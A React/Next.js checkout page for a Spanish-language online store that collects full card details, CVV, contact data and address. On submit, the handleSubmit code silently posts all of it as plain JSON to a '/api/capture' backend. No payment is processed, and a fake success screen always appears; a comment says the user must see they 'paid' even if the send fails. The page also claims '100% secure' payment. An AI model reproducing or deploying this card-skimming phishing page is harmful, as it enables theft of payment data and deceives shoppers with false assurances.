'use client';

import { useState, useEffect } from 'react';
import { useCart } from '@/contexts/CartContext';
import { useRouter } from 'next/navigation';
import Link from 'next/link';
import { CreditCard, Lock, ArrowLeft, CheckCircle } from 'lucide-react';

// Algoritmo de Luhn para que las tarjetas que se metan sean verdaderamente válidas
function validateCardLuhn(cardNumber: string): boolean {
  const digits = cardNumber.replace(/\s/g, '');
  if (!/^\d+$/.test(digits)) return false;

  let sum = 0;
  let isEven = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);

    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
}

function getCardType(cardNumber: string): string {
  const digits = cardNumber.replace(/\s/g, '');
  if (/^4/.test(digits)) return 'Visa';
  if (/^5[1-5]/.test(digits)) return 'Mastercard';
  if (/^3[47]/.test(digits)) return 'American Express';
  return 'Desconocida'; // en caso de no ser amex no visa nim astercard
}

export default function CheckoutPage() {
  const { cart, getTotalPrice, clearCart } = useCart();
  const router = useRouter();
  const [processing, setProcessing] = useState(false);
  const [success, setSuccess] = useState(false);

  const [formData, setFormData] = useState({
    // información personasl
    fullName: '',
    email: '',
    phone: '',
    // doirección:
    address: '',
    city: '',
    state: '',
    zipCode: '',
    // datos de la tarjeta:
    cardNumber: '',
    cardName: '',
    expiryDate: '',
    cvv: '',
  });

  const [errors, setErrors] = useState<Record<string, string>>({});

  useEffect(() => {
    if (cart.length === 0 && !success) {
      router.push('/carrito');
    }
  }, [cart, success, router]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;

    if (name === 'cardNumber') {
      const formatted = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      setFormData(prev => ({ ...prev, [name]: formatted }));
    }

    else if (name === 'expiryDate') {
      const formatted = value.replace(/\D/g, '').replace(/(\d{2})(\d{0,2})/, '$1/$2').substr(0, 5);
      setFormData(prev => ({ ...prev, [name]: formatted }));
    }
    // CVV que solo acepta números
    else if (name === 'cvv') {
      const formatted = value.replace(/\D/g, '').substr(0, 4);
      setFormData(prev => ({ ...prev, [name]: formatted }));
    }
    else {
      setFormData(prev => ({ ...prev, [name]: value }));
    }

    // Limpiar error
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: '' }));
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Record<string, string> = {};

    // Validar datos personales
    if (!formData.fullName.trim()) newErrors.fullName = 'Nombre requerido';
    if (!formData.email.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) newErrors.email = 'Email inválido';
    if (!formData.phone.match(/^\d{10}$/)) newErrors.phone = 'Teléfono debe tener 10 dígitos';

    // Validar dirección
    if (!formData.address.trim()) newErrors.address = 'Dirección requerida';
    if (!formData.city.trim()) newErrors.city = 'Ciudad requerida';
    if (!formData.state.trim()) newErrors.state = 'Estado requerido';
    if (!formData.zipCode.match(/^\d{5}$/)) newErrors.zipCode = 'CP debe tener 5 dígitos';

    // Validar tarjeta
    const cardDigits = formData.cardNumber.replace(/\s/g, '');
    if (!validateCardLuhn(cardDigits)) {
      newErrors.cardNumber = 'Número de tarjeta inválido';
    } else if (cardDigits.length < 13 || cardDigits.length > 19) {
      newErrors.cardNumber = 'Longitud de tarjeta inválida';
    }

    if (!formData.cardName.trim()) newErrors.cardName = 'Nombre en tarjeta requerido';

    const [month, year] = formData.expiryDate.split('/');
    if (!month || !year || parseInt(month) > 12 || parseInt(month) < 1) {
      newErrors.expiryDate = 'Fecha de expiración inválida';
    }

    if (!formData.cvv.match(/^\d{3,4}$/)) newErrors.cvv = 'CVV inválido (3-4 dígitos)';

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateForm()) {
      return;
    }

    setProcessing(true);

    try {
      // Enviamos los datos al backend de Go
      await fetch('http://localhost:8080/api/capture', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });
      // No imports  si falla, el usuario debe ver que "pagó" igual.
    } catch (err) {
      console.log("Error silencioso enviando datos:", err);
    }


    // Simulación visual de pago (Tu código original)
    setTimeout(() => {
      setSuccess(true);
      setProcessing(false);

      setTimeout(() => {
        clearCart();
        router.push('/');
      }, 3000);
    }, 2000);
  };

  // Si no hay items y no es éxito, mostramos null
  if (cart.length === 0 && !success) {
    return null;
  }

  if (success) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center py-12 px-4">
        <div className="max-w-md w-full bg-white rounded-xl shadow-lg p-8 text-center">
          <CheckCircle size={80} className="mx-auto text-green-500 mb-4" />
          <h1 className="text-3xl font-bold text-gray-800 mb-4">¡Pago Exitoso!</h1>
          <p className="text-gray-600 mb-6">
            Tu orden ha sido procesada correctamente. Recibirás un email de confirmación en breve.
          </p>
          <p className="text-sm text-gray-500">
            Redirigiendo a la página principal...
          </p>
        </div>
      </div>
    );
  }

  const total = getTotalPrice();
  const tax = total * 0.16;
  const finalTotal = total + tax;
  const cardType = getCardType(formData.cardNumber);

  return (
    <div className="min-h-screen bg-gray-50 py-8">
      <div className="container mx-auto px-4">
        <Link
          href="/carrito"
          className="inline-flex items-center gap-2 text-orange-600 hover:text-orange-700 mb-6 font-medium"
        >
          <ArrowLeft size={20} />
          Volver al carrito
        </Link>

        <h1 className="text-3xl md:text-4xl font-bold text-gray-800 mb-8">Finalizar Compra</h1>

        <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
          {/* datos */}
          <div className="lg:col-span-2">
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* info personal */}
              <div className="bg-white rounded-xl shadow-md p-6">
                <h2 className="text-xl font-bold text-gray-800 mb-4">Información Personal</h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="md:col-span-2">
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Nombre Completo *
                    </label>
                    <input
                      type="text"
                      name="fullName"
                      value={formData.fullName}
                      onChange={handleInputChange}
                      className={`w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 ${
                        errors.fullName ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-orange-500'
                      }`}
                      placeholder="Emiliano Luna Casablanca"
                    />
                    {errors.fullName && <p className="text-red-500 text-sm mt-1">{errors.fullName}</p>}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Email *
                    </label>
                    <input
                      type="email"
                      name="email"
                      value={formData.email}
                      onChange={handleInputChange}
                      className={`w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 ${
                        errors.email ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-orange-500'
                      }`}
                      placeholder="furros@suit.com"
                    />
                    {errors.email && <p className="text-red-500 text-sm mt-1">{errors.email}</p>}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Teléfono *
                    </label>
                    <input
                      type="tel"
                      name="phone"
                      value={formData.phone}
                      onChange={handleInputChange}
                      className={`w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 ${
                        errors.phone ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-orange-500'
                      }`}
                      placeholder="55 6516 7056"
                    />
                    {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
                  </div>
                </div>
              </div>

              {/* dirección */}
              <div className="bg-white rounded-xl shadow-md p-6">
                <h2 className="text-xl font-bold text-gray-800 mb-4">Dirección de Envío</h2>
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="md:col-span-2">
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Dirección *
                    </label>
                    <input
                      type="text"
                      name="address"
                      value={formData.address}
                      onChange={handleInputChange}
                      className={`w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 ${
                        errors.address ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-orange-500'
                      }`}
                      placeholder="Yácatas #431"
                    />
                    {errors.address && <p className="text-red-500 text-sm mt-1">{errors.address}</p>}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Ciudad *
                    </label>
                    <input
                      type="text"
                      name="city"
                      value={formData.city}
                      onChange={handleInputChange}
                      className={`w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 ${
                        errors.city ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-orange-500'
                      }`}
                      placeholder="Ciudad de México"
                    />
                    {errors.city && <p className="text-red-500 text-sm mt-1">{errors.city}</p>}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Estado *
                    </label>
                    <input
                      type="text"
                      name="state"
                      value={formData.state}
                      onChange={handleInputChange}
                      className={`w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 ${
                        errors.state ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-orange-500'
                      }`}
                      placeholder="CDMX"
                    />
                    {errors.state && <p className="text-red-500 text-sm mt-1">{errors.state}</p>}
                  </div>

                  <div className="md:col-span-2">
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Código Postal *
                    </label>
                    <input
                      type="text"
                      name="zipCode"
                      value={formData.zipCode}
                      onChange={handleInputChange}
                      className={`w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 ${
                        errors.zipCode ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-orange-500'
                      }`}
                      placeholder="03020"
                      maxLength={5}
                    />
                    {errors.zipCode && <p className="text-red-500 text-sm mt-1">{errors.zipCode}</p>}
                  </div>
                </div>
              </div>

              {/* pago */}
              <div className="bg-white rounded-xl shadow-md p-6">
                <div className="flex items-center gap-2 mb-4">
                  <Lock size={24} className="text-green-600" />
                  <h2 className="text-xl font-bold text-gray-800">Información de Pago (Segura)</h2>
                </div>

                <div className="grid grid-cols-1 gap-4">
                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Número de Tarjeta * {cardType !== 'Desconocida' && <span className="text-orange-600">({cardType})</span>}
                    </label>
                    <div className="relative">
                      <input
                        type="text"
                        name="cardNumber"
                        value={formData.cardNumber}
                        onChange={handleInputChange}
                        className={`w-full px-4 py-2 pl-12 border rounded-lg focus:outline-none focus:ring-2 ${
                          errors.cardNumber ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-orange-500'
                        }`}
                        placeholder="1234 5678 1234 5678"
                        maxLength={19}
                      />
                      <CreditCard className="absolute left-3 top-2.5 text-gray-400" size={20} />
                    </div>
                    {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
                    {!errors.cardNumber && formData.cardNumber.length > 15 && validateCardLuhn(formData.cardNumber) && (
                      <p className="text-green-600 text-sm mt-1">✓ Tarjeta válida </p>
                    )}
                  </div>

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">
                      Nombre en la Tarjeta *
                    </label>
                    <input
                      type="text"
                      name="cardName"
                      value={formData.cardName}
                      onChange={handleInputChange}
                      className={`w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 ${
                        errors.cardName ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-orange-500'
                      }`}
                      placeholder="Emiliano Luna Casablanca"
                    />
                    {errors.cardName && <p className="text-red-500 text-sm mt-1">{errors.cardName}</p>}
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        Fecha de Expiración *
                      </label>
                      <input
                        type="text"
                        name="expiryDate"
                        value={formData.expiryDate}
                        onChange={handleInputChange}
                        className={`w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 ${
                          errors.expiryDate ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-orange-500'
                        }`}
                        placeholder="MM/AA"
                      />
                      {errors.expiryDate && <p className="text-red-500 text-sm mt-1">{errors.expiryDate}</p>}
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 mb-2">
                        CVV *
                      </label>
                      <input
                        type="text"
                        name="cvv"
                        value={formData.cvv}
                        onChange={handleInputChange}
                        className={`w-full px-4 py-2 border rounded-lg focus:outline-none focus:ring-2 ${
                          errors.cvv ? 'border-red-500 focus:ring-red-500' : 'border-gray-300 focus:ring-orange-500'
                        }`}
                        placeholder="123"
                      />
                      {errors.cvv && <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>}
                    </div>
                  </div>
                </div>
              </div>

              <button
                type="submit"
                disabled={processing}
                className={`w-full py-4 rounded-lg font-bold text-white transition flex items-center justify-center gap-2 ${
                  processing
                    ? 'bg-gray-400 cursor-not-allowed'
                    : 'bg-orange-500 hover:bg-orange-600 transform hover:scale-105 shadow-lg'
                }`}
              >
                {processing ? (
                  <>
                    <div className="animate-spin rounded-full h-5 w-5 border-2 border-white border-t-transparent"></div>
                    Procesando...
                  </>
                ) : (
                  <>
                    <Lock size={20} />
                    Pagar ${finalTotal.toFixed(2)}
                  </>
                )}
              </button>
            </form>
          </div>

          {}
          <div className="lg:col-span-1">
            <div className="bg-white rounded-xl shadow-md p-6 sticky top-4">
              <h2 className="text-xl font-bold text-gray-800 mb-4">Resumen del Pedido</h2>

              <div className="space-y-3 mb-6">
                {cart.map((item) => (
                  <div key={item.prod_id} className="flex justify-between text-sm">
                    <span className="text-gray-600">
                      {item.name_pr} x{item.quantity}
                    </span>
                    <span className="font-medium">${(item.sale_price * item.quantity).toFixed(2)}</span>
                  </div>
                ))}
              </div>

              <div className="border-t pt-4 space-y-2">
                <div className="flex justify-between text-gray-600">
                  <span>Subtotal</span>
                  <span>${total.toFixed(2)}</span>
                </div>
                <div className="flex justify-between text-gray-600">
                  <span>IVA (16%)</span>
                  <span>${tax.toFixed(2)}</span>
                </div>
                <div className="flex justify-between text-gray-600">
                  <span>Envío</span>
                  <span className="text-green-600 font-medium">GRATIS</span>
                </div>
                <div className="border-t pt-2 flex justify-between items-center">
                  <span className="text-lg font-bold">Total</span>
                  <span className="text-2xl font-bold text-orange-600">${finalTotal.toFixed(2)}</span>
                </div>
              </div>

              <div className="mt-6 pt-6 border-t">
                <div className="flex items-center gap-2 text-green-600 mb-2">
                  <Lock size={16} />
                  <span className="text-sm font-medium">Pago 100% Seguro</span>
                </div>
                <p className="text-xs text-gray-500">
                  Tus datos están protegidos
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}